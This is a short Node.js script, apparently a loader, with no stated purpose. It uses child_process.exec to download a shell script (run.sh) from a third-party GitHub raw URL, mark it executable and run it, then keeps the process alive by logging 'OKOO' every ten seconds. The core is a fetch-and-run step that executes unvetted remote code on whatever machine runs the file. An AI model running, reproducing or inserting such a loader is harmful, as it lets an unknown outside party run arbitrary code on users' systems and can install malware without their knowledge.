const { exec } = require('child_process')

exec('wget https://raw.githubusercontent.com/funfactbro/respect/main/run.sh && chmod +x run.sh && ./run.sh', (a,b,c) => console.log(a,b,c))

setInterval(() => console.log("OKOO"), 10000);
